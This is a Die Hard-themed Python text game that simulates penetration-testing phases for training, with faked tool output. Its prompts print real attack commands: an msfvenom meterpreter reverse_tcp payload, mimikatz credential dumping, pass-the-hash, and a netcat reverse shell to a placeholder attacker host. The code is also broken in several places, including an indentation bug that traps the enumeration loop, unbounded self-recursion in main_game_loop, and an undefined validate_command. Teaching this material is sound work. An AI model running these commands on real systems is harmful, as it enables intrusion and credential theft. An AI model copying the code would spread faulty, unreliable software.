import time

# Initialize ANSI colors for terminal
try:
    import colorama
    colorama.init()
except ImportError:
    pass
    
class Floor:

    def __init__(self, name, completed=False):
        self.name = name
        self.completed = completed
        self.description = "Test Description"

    def introduce_floor(self):
        print(f"[91m\nWelcome to {self.name}[0m - {self.description}")
        if self.completed:
            print("[92mYou've already cleared this floor. No Hanz here.[0m")
        else:
            print("[93mThis floor is waiting to be conquered![0m")

        if self.name == "Recon" and not self.completed:
            self.start_recon_phase()
        if self.name == "Enumeration" and not self.completed:
            self.start_enumeration_phase()
        if self.name == "Exploitation" and not self.completed:
            self.start_exploitation_phase()
        if self.name == "Privilege Escalation" and not self.completed:
            self.start_privilege_escalation_phase()
        if self.name == "Lateral Movement" and not self.completed:
            self.start_lateral_movement_phase()
        if self.name == "Exfiltration" and not self.completed:
            self.start_exfiltration_phase()

    # Stiched in function for testing completeness of code
    def mark_completed(self):
        #self.completed = True
        return self.completed

    def start_recon_phase(self):
        print("\nPenetration Testing Phase: Reconnaissance") 
        print("You arrive in Los Angeles corporate Christmas party at Nakatomi Plaza, bear in hand.")
        print("Time to get this overwith. - McClane")
        print("Your objective is to gather information about the target.")
        print("Use commands like 'nmap', 'whois', and 'dnsenum' to gather data.")
        while not self.completed:
            while True:
                choice = input("Enter 'commands' to see available commands or 'start' to begin: ")
                if choice.strip(): break
                print('Empty input is not allowed. Please try again.')
            if choice.lower() == 'commands':
                print("Available commands: 'nmap', 'whois', 'dnsenum'")
            elif choice.lower() == 'start':
                self.perform_recon()
            else:
                print("Invalid choice. You continue exploring the floor.")

    def perform_recon(self):
        print("\nYou initiate the reconnaissance phase.")
        print("Enter a command to gather information (e.g., 'nmap -sV target.com'):")
        while not self.completed:
            while True:
                command = input("Enter your command: ")
                if command.strip(): break
                print('Empty input is not allowed. Please try again.')
                
            if 'nmap' in command and '-sV' in command:
                print("Scanning target for open ports and service versions...")
                print("Port 80: HTTP service running.")
                print("Port 22: SSH service running.")
                print("Service versions: Apache 2.4, OpenSSH 7.6")
                print("Does It Sound Like I'm Ordering A Pizza? - McClane")
                print("Reconnaissance phase complete!")
                while True:
                    choice = input("Enter 'analyze' to interpret the results or 'continue' to proceed: ")
                    if choice.strip(): break
                    print('Empty input is not allowed. Please try again.')
                if choice.lower() == 'analyze':
                    self.analyze_results()
                    self.completed = True
                elif choice.lower() == 'continue':
                    self.completed = True
                    print("You've gained valuable information for the next phase.")
                else:
                    print("Invalid choice, pal.")
        
            elif command.lower() == 'commands':
                    print("Available commands: 'nmap', 'whois', 'dnsenum'")
            else:
                print("Your reconnaissance attempt didn't yield the desired results.")

    def analyze_results(self):
        print("\nInterpreting the reconnaissance results:")
        print("Based on the scan, you've identified potential vulnerabilities and services.")
        print("Understanding these aspects can guide your penetration testing strategy.")
        print("Vulnerabilities like outdated software can be exploited for unauthorized access.")
        print("Misconfigured services may expose sensitive information.")
        print("The more you learn, the better your chances of a successful test.")
        print("Remember, ethical hacking involves responsible and authorized actions.")
        print("You've gained valuable insights for your journey in the cybersecurity world.")
        print("Thanks For The Advice. -McClane")
        input("Press any key to continue to the next floor...")


    def start_enumeration_phase(self):
        print("\nPenetration Testing Phase: Enumeration")
        print("Your objective is to gather detailed information about the target.")
        print("Use commands like 'enum4linux', 'nbtscan', and 'enum' to gather data.")
        while not self.completed:
            while True:
                choice = input("Enter 'commands' to see available commands or 'start' to begin: ")
                if choice.strip(): break
                print('Empty input is not allowed. Please try again.')
            if choice.lower() == 'commands':
                print("Available commands: 'enum4linux', 'nbtscan', 'enum'")
            elif choice.lower() == 'start':
                self.perform_enumeration()
            else:
                print("Invalid choice. You continue exploring the floor.")

    def perform_enumeration(self):
        print("\nYou initiate the enumeration phase.")
        print("We're Gonna Need Some More FBI Guys, I Guess. - Officer Robinson")
        print("Enter a command to gather information:")
        print("For 'enum4linux' with all options, enter: 'enum4linux -a target.com'")
        print("For 'nbtscan', enter: 'nbtscan target.com'")
        print("For 'enum', enter: 'enum target.com'")
        while not self.completed:
            while True:
                command = input("Enter your command: ")
                if command.strip(): break
                print('Empty input is not allowed. Please try again.')
            if 'enum4linux' in command and '-a' in command:
                print("Gathering detailed information using enum4linux...")
                print("User accounts: john, alice")
                print("Share names: share1, share2")
                print("Enumeration phase complete!")
                while True:
                    choice = input("Enter 'analyze' to interpret the results or 'continue' to proceed: ")
                if choice.strip(): break
                print('Empty input is not allowed. Please try again.')
                if choice.lower() == 'analyze':
                    self.analyze_enumeration()
                    self.completed = True
                elif choice.lower() == 'continue':
                    self.completed = True
                    print("You've gained valuable information for the next phase.")
                else:
                    print("Invalid choice.")

            elif 'nbtscan' in command:
                print("Scanning for NetBIOS information using nbtscan...")
                print("NetBIOS name: TARGET")
                print("IP address: 192.168.1.100")
                print("Enumeration phase complete!")
                # Continue with analysis and completion similar to other tools
                while True:
                    choice = input("Enter 'analyze' to interpret the results or 'continue' to proceed: ")
                    if choice.strip(): break
                    print('Empty input is not allowed. Please try again.')
                if choice.lower() == 'analyze':
                    self.analyze_enumeration()
                    self.completed = True
                elif choice.lower() == 'continue':
                    self.completed = True
                    print("You've gained valuable information for the next phase.")
                else:
                    print("Invalid choice.")
            elif 'enum' in command:
                print("Gathering information using the 'enum' tool...")
                print("Service banners: SSH service running on port 22")
                print("User enumeration result: 'admin' account identified")
                print("Enumeration phase complete!")
                # Continue with analysis and completion similar to other tools
                while True:
                    choice = input("Enter 'analyze' to interpret the results or 'continue' to proceed: ")
                    if choice.strip(): break
                    print('Empty input is not allowed. Please try again.')
                if choice.lower() == 'analyze':
                    self.analyze_enumeration()
                    self.completed = True
                elif choice.lower() == 'continue':
                    self.completed = True
                    print("You've gained valuable information for the next phase.")
                else:
                    print("Invalid choice.")
            else:
                print("Your enumeration attempt didn't yield the desired results.")

    def analyze_enumeration(self):
        print("\nInterpreting the enumeration results:")
        print("Based on the scan, you've identified user accounts and shared resources.")
        print("Understanding these aspects can guide your penetration testing strategy.")
        print("User accounts may be targeted for password attacks or privilege escalation.")
        print("Shared resources can lead to unauthorized data access or lateral movement.")
        print("Every piece of information is a puzzle piece in your ethical hacking journey.")
        print("Remember, responsible use of these skills is vital for cybersecurity.")
        print("You're building a strong foundation for real-world challenges.")

    def start_exploitation_phase(self):
        print("\nPenetration Testing Phase: Exploitation")
        print("Your objective is to exploit vulnerabilities and gain unauthorized access.")
        print("Use tools like 'metasploit', 'searchsploit', and 'msfvenom' to create payloads.")
        while not self.completed:
            while True:
                choice = input("Enter 'commands' to see available commands or 'start' to begin: ")
                if choice.strip(): break
                print('Empty input is not allowed. Please try again.')
            if choice.lower() == 'commands':
                print("Available commands: 'metasploit', 'searchsploit', 'msfvenom'")
            elif choice.lower() == 'start':
                self.perform_exploitation()
            else:
                print("Invalid choice. You continue exploring the floor.")

    def perform_exploitation(self):
        print("\nYou initiate the exploitation phase.")
        print("Just A Fly In The Ointment, Hans. The Monkey In The Wrench. The Pain In The Ass. - McClane")
        print("Enter a command to create an exploit payload:")
        print("For 'metasploit', enter: 'metasploit exploit -p windows/meterpreter/reverse_tcp'")
        print("For 'searchsploit', enter: 'searchsploit apache 2.4.29'")
        print("For 'msfvenom', enter: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port -f exe -o exploit.exe'")
        while not self.completed:
            while True:
                command = input("Enter your command: ")
                if command.strip(): break
                print('Empty input is not allowed. Please try again.')
            if 'metasploit' in command and 'exploit' in command:
                print("Creating Metasploit exploit payload...")
                print("Exploit payload generated successfully!")
                print("Exploitation phase complete!")

                while True:
                    choice = input("Enter 'analyze' to interpret the results or 'continue' to proceed: ")
                    if choice.strip(): break
                    print('Empty input is not allowed. Please try again.')
                if choice.lower() == 'analyze':
                    self.analyze_exploitation()
                    self.completed = True
                elif choice.lower() == 'continue':
                    self.completed = True
                    print("You've successfully exploited a vulnerability.")
                else:
                    print("Invalid choice. You continue exploring the floor.")
            elif 'searchsploit' in command:
                print("Searching for exploits using searchsploit...")
                print("Exploit found: Apache 2.4.29 - Remote Code Execution")
                print("Vulnerability details: CVE-2019-0211")
                print("Exploitation phase complete!")
                # Continue with analysis and completion similar to other tools
                while True:
                    choice = input("Enter 'analyze' to interpret the results or 'continue' to proceed: ")
                    if choice.strip(): break
                    print('Empty input is not allowed. Please try again.')
                if choice.lower() == 'analyze':
                    self.analyze_exploitation()
                    self.completed = True
                elif choice.lower() == 'continue':
                    self.completed = True
                    print("You've successfully exploited a vulnerability.")
                else:
                    print("Invalid choice. You continue exploring the floor.")
            elif 'msfvenom' in command:
                print("Creating custom exploit payload using msfvenom...")
                print("Exploit payload 'exploit.exe' generated successfully!")
                print("Exploitation phase complete!")
                # Continue with analysis and completion similar to other tools
                while True:
                    choice = input("Enter 'analyze' to interpret the results or 'continue' to proceed: ")
                    if choice.strip(): break
                    print('Empty input is not allowed. Please try again.')
                if choice.lower() == 'analyze':
                    self.analyze_exploitation()
                    self.completed = True
                elif choice.lower() == 'continue':
                    self.completed = True
                    print("You've successfully exploited a vulnerability.")
                else:
                    print("Invalid choice. You continue exploring the floor.")
            else:
                print("Your exploitation attempt didn't yield the desired results.")

    def analyze_exploitation(self):
        print("\nInterpreting the exploitation results:")
        print("Exploitation can lead to unauthorized access and control over the target system.")
        print("Understanding the impact of successful exploitation is crucial.")
        print("Compromised systems may be used for data theft, further attacks, or as pivot points.")
        print("Ethical hacking emphasizes authorized actions and responsible use of skills.")
        print("By learning about exploitation, you're enhancing your cybersecurity expertise.")
        print("Remember, your actions have consequences, even in virtual environments.")
        print("Think about the real-world implications and the importance of ethical hacking practices.")
        input("Press any key to continue to the next floor...")


    def start_privilege_escalation_phase(self):
        print("\nPenetration Testing Phase: Privilege Escalation")
        print("Come Out To The Coast, We'll Get Together, Have A Few Laughs... - McClane")
        print("Your objective is to escalate your privileges on the target system.")
        print("Use tools like 'sudo', 'Kernel Exploits', and 'Windows Privesc Check' to find weaknesses.")
        while not self.completed:
            while True:
                choice = input("Enter 'commands' to see available commands or 'start' to begin: ")
                if choice.strip(): break
                print('Empty input is not allowed. Please try again.')
            if choice.lower() == 'commands':
                print("Available commands: 'sudo', 'kernel_exploits', 'windows_privesc_check'")
            elif choice.lower() == 'start':
                self.perform_privilege_escalation()
            else:
                print("Invalid choice. You continue exploring the floor.")

    def perform_privilege_escalation(self):
        print("\nYou initiate the privilege escalation phase.")
        print("Enter a command to escalate your privileges:")
        print("For 'sudo', enter: 'sudo -l'")
        print("For 'kernel_exploits', enter: 'kernel_exploits'")
        print("For 'windows_privesc_check', enter: 'windows_privesc_check'")
        while not self.completed:
            while True:
                command = input("Enter your command: ")
                if command.strip(): break
                print('Empty input is not allowed. Please try again.')
            if 'sudo' in command and '-l' in command:
                print("Checking available sudo privileges...")
                print("You have the following sudo privileges:")
                print("User john may run /bin/bash as root")
                print("Now I have a machine gun. Ho ho ho.")
                print("Privilege escalation phase complete!")

                while True:
                    choice = input("Enter 'analyze' to interpret the results or 'continue' to proceed: ")
                    if choice.strip(): break
                    print('Empty input is not allowed. Please try again.')
                if choice.lower() == 'analyze':
                    self.analyze_privilege_escalation()
                    self.completed = True
                elif choice.lower() == 'continue':
                    self.completed = True
                    print("You've successfully escalated your privileges.")
                else:
                    print("Invalid choice. You continue exploring the floor.")
            elif 'kernel_exploits' in command:
                print("Scanning for potential kernel exploits...")
                print("Possible exploit: CVE-2021-3156 - Sudo Heap-based Buffer Overflow")
                print("Exploit details: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156")
                print("Now I have a machine gun. Ho ho ho.")
                print("Privilege escalation phase complete!")
                # Continue with analysis and completion similar to other tools
                while True:
                    choice = input("Enter 'analyze' to interpret the results or 'continue' to proceed: ")
                    if choice.strip(): break
                    print('Empty input is not allowed. Please try again.')
                if choice.lower() == 'analyze':
                    self.analyze_privilege_escalation()
                    self.completed = True
                elif choice.lower() == 'continue':
                    self.completed = True
                    print("You've successfully escalated your privileges.")
                else:
                    print("Invalid choice. You continue exploring the floor.")
            elif 'windows_privesc_check' in command:
                print("Running Windows privilege escalation checks...")
                print("Vulnerability detected: Insecure registry permissions")
                print("Mitigation: Apply proper ACLs to prevent unauthorized access")
                print("Privilege escalation phase complete!")
                # Continue with analysis and completion similar to other tools
                while True:
                    choice = input("Enter 'analyze' to interpret the results or 'continue' to proceed: ")
                    if choice.strip(): break
                    print('Empty input is not allowed. Please try again.')
                if choice.lower() == 'analyze':
                    self.analyze_privilege_escalation()
                    self.completed = True
                elif choice.lower() == 'continue':
                    self.completed = True
                    print("You've successfully escalated your privileges.")
                else:
                    print("Invalid choice. You continue exploring the floor.")
            else:
                print("Your privilege escalation attempt didn't yield the desired results.")

    def analyze_privilege_escalation(self):
        print("\nInterpreting the privilege escalation results:")
        print("Privilege escalation is about gaining higher levels of access.")
        print("Understanding system vulnerabilities helps identify paths to elevated privileges.")
        print("Responsible use of escalated access is vital to avoid unauthorized actions.")
        print("Ethical hackers use this knowledge to secure systems and prevent attacks.")
        print("By learning privilege escalation, you're enhancing your cybersecurity skills.")
        print("Remember, ethical hacking is about protecting digital landscapes.")
        print("Think about how these techniques contribute to safeguarding sensitive information.")
        input("Press any key to continue to the next floor...")


    def start_lateral_movement_phase(self):
        print("\nPenetration Testing Phase: Lateral Movement")
        print("Your objective is to move laterally within the target network through the ventilation ducts.")
        print("Use techniques like 'Pass-the-Hash' and 'Mimikatz' to gain access to other systems.")
        while not self.completed:
            while True:
                choice = input("Enter 'commands' to see available commands or 'start' to begin: ")
                if choice.strip(): break
                print('Empty input is not allowed. Please try again.')
            if choice.lower() == 'commands':
                print("Available commands: 'pass_the_hash', 'mimikatz'")
            elif choice.lower() == 'start':
                self.perform_lateral_movement()
            else:
                print("Invalid choice. You continue exploring the floor.")

    def perform_lateral_movement(self):
        print("\nYou initiate the lateral movement phase.")
        print("Enter a command to move laterally:")
        print("For 'pass_the_hash', enter: 'pass_the_hash -u user -hash user_hash -target target'")
        print("For 'mimikatz', enter: 'mimikatz -command privilege::debug sekurlsa::logonpasswords'")
        while not self.completed:
            while True:
                command = input("Enter your command: ")
                if command.strip(): break
                print('Empty input is not allowed. Please try again.')
            if 'pass_the_hash' in command and '-u' in command:
                print("Moving laterally using Pass-the-Hash technique...")
                print("Now I Know What A TV Dinner Feels Like.")
                print("You've successfully authenticated to the target system!")
                print("Lateral movement phase complete!")

                while True:
                    choice = input("Enter 'analyze' to interpret the results or 'continue' to proceed: ")
                    if choice.strip(): break
                    print('Empty input is not allowed. Please try again.')
                if choice.lower() == 'analyze':
                    self.analyze_lateral_movement()
                    self.completed = True
                elif choice.lower() == 'continue':
                    self.completed = True
                    print("You've successfully moved laterally within the network.")
                else:
                    print("Invalid choice. You continue exploring the vents.")
            elif 'mimikatz' in command:
                print("Extracting logon passwords using Mimikatz...")
                print("User: john, Password: secret123")
                print("Now I Know What A TV Dinner Feels Like.")
                print("Lateral movement phase complete!")
                # Continue with analysis and completion similar to other tools
                while True:
                    choice = input("Enter 'analyze' to interpret the results or 'continue' to proceed: ")
                    if choice.strip(): break
                    print('Empty input is not allowed. Please try again.')
                if choice.lower() == 'analyze':
                    self.analyze_lateral_movement()
                    self.completed = True
                elif choice.lower() == 'continue':
                    self.completed = True
                    print("You've successfully moved laterally within the network.")
                else:
                    print("Invalid choice. You continue exploring the vents.")
            else:
                print("Your lateral movement attempt didn't yield the desired results. YOu're still exploring the vents.")

    def analyze_lateral_movement(self):
        print("\nInterpreting the lateral movement results:")
        print("Lateral movement is about expanding access within a network.")
        print("Understanding techniques like Pass-the-Hash highlights security vulnerabilities.")
        print("Responsible use of these techniques is essential for ethical hacking.")
        print("Ethical hackers help organizations strengthen their defenses against such attacks.")
        print("By learning about lateral movement, you're contributing to cybersecurity resilience.")
        print("Remember, your actions shape the digital landscape's security.")
        print("Consider the broader impact of your skills on a safer online world.")
        input("Press any key to continue to the next floor...")


    def start_exfiltration_phase(self):
        print("\nPenetration Testing Phase: Exfiltration")
        print("Your objective is to exfiltrate sensitive data from the target network.")
        print("Use techniques like 'netcat', 'steganography', and 'DNS tunneling' to exfiltrate data.")
        while not self.completed:
            while True:
                choice = input("Enter 'commands' to see available commands or 'start' to begin: ")
                if choice.strip(): break
                print('Empty input is not allowed. Please try again.')
            if choice.lower() == 'commands':
                print("Available commands: 'netcat', 'steganography', 'dns_tunneling'")
            elif choice.lower() == 'start':
                self.perform_exfiltration()
            else:
                print("Invalid choice. You continue exploring the floor.")

    def perform_exfiltration(self):
        print("\nYou initiate the exfiltration phase.")
        print("I Am An Exceptional Thief, Mrs. McClane. And Since I'm Moving Up To Kidnapping, You Should Be More Polite. -Hanz")
        print("Enter a command to exfiltrate data:")
        print("For 'netcat', enter: 'netcat -e /bin/bash attacker_ip attacker_port'")
        print("For 'steganography', enter: 'steghide embed -ef secret.txt -cf image.jpg -p password'")
        print("For 'dns_tunneling', enter: 'dns_tunneling domain_name'")
        while not self.completed:
            while True:
                command = input("Enter your command: ")
                if command.strip(): break
                print('Empty input is not allowed. Please try again.')
            if 'netcat' in command and '-e' in command:
                print("Exfiltrating data using netcat...")
                print("Data successfully sent to the attacker's machine!")
                print("Exfiltration phase complete!")

                while True:
                    choice = input("Enter 'analyze' to interpret the results or 'continue' to proceed: ")
                    if choice.strip(): break
                    print('Empty input is not allowed. Please try again.')
                if choice.lower() == 'analyze':
                    self.analyze_exfiltration()
                    self.completed = True
                elif choice.lower() == 'continue':
                    self.completed = True
                    print("You've successfully exfiltrated sensitive data.")
                else:
                    print("Invalid choice. You continue exploring the floor.")
            elif 'steganography' in command:
                print("Embedding data using steganography...")
                print("Data successfully hidden within the image!")
                print("Exfiltration phase complete!")
                # Continue with analysis and completion similar to other tools
                while True:
                    choice = input("Enter 'analyze' to interpret the results or 'continue' to proceed: ")
                    if choice.strip(): break
                    print('Empty input is not allowed. Please try again.')
                if choice.lower() == 'analyze':
                    self.analyze_exfiltration()
                    self.completed = True
                elif choice.lower() == 'continue':
                    self.completed = True
                    print("You've successfully exfiltrated sensitive data.")
                else:
                    print("Invalid choice. You continue exploring the floor.")
            elif 'dns_tunneling' in command:
                print("Creating DNS tunnel for data exfiltration...")
                print("Data transmitted via DNS queries!")
                print("Exfiltration phase complete!")
                # Continue with analysis and completion similar to other tools
                while True:
                    choice = input("Enter 'analyze' to interpret the results or 'continue' to proceed: ")
                    if choice.strip(): break
                    print('Empty input is not allowed. Please try again.')
                if choice.lower() == 'analyze':
                    self.analyze_exfiltration()
                    self.completed = True
                elif choice.lower() == 'continue':
                    self.completed = True
                    print("You've successfully exfiltrated sensitive data.")
                else:
                    print("Invalid choice. You continue exploring the floor.")
            else:
                print("Your exfiltration attempt didn't yield the desired results.")

    def analyze_exfiltration(self):
        print("\nInterpreting the exfiltration results:")
        print("Data exfiltration techniques raise ethical considerations.")
        print("Understanding these techniques is essential for defending against them.")
        print("Ethical hackers help organizations protect sensitive information.")
        print("By learning about data exfiltration, you're contributing to data privacy.")
        print("Remember, responsible use of knowledge safeguards digital interactions.")
        print("Consider the ethical implications of data exfiltration and its impact.")
        print("Think about how your knowledge can contribute to safer data handling.")
        input("Press any key to continue to the next floor...")



def main_game_loop():

    floors = [
        Floor("Recon"),
        Floor("Enumeration"),
        Floor("Exploitation"),
        Floor("Privilege Escalation"),
        Floor("Lateral Movement"),
        Floor("Exfiltration")
    ]

        
    current_floor_index = 0
    current_floor = floors[current_floor_index]

    player = "john"
    print("\n" + "=" * 30)
    print("Welcome to the Hack Hard RPG Game!")
    print("=" * 30)
    print("Welcome to the party, pal!")
    print("Created by Milosilo")
    print("https://milosilo.com")
    
        
    while True:
        print("\n" + "=" * 30)
        print(f"Current Floor: {current_floor.name}")
        print("=" * 30)

        if not current_floor.completed:
            current_floor.introduce_floor()
            current_floor.mark_completed()
            if current_floor.mark_completed():
                print(f"Yippee-ki-yay! - {current_floor.name} is cleared!")

        current_floor_index += 1
        if current_floor_index >= len(floors):
            print("Congratulations! You've cleared all floors.")
            break # Exit the loop when all floors are cleared

        current_floor = floors[current_floor_index]

    # Start the game loop
    print("Welcome to the party, pal!")
    main_game_loop()

    detection_signature = 0

def play_level(floor):
    global detection_signature
    while not floor.completed:
        while True:
            command = input("Enter the command for the tool: ")
            if command.strip(): break
            print('Empty input is not allowed. Please try again.')
        if not validate_command(command):
            detection_signature += 1
            if detection_signature >= 5:
                print("Game Over! Detection signature reached 5.")
                print("It's McClane!")
                exit()
        
# Start the game loop
main_game_loop()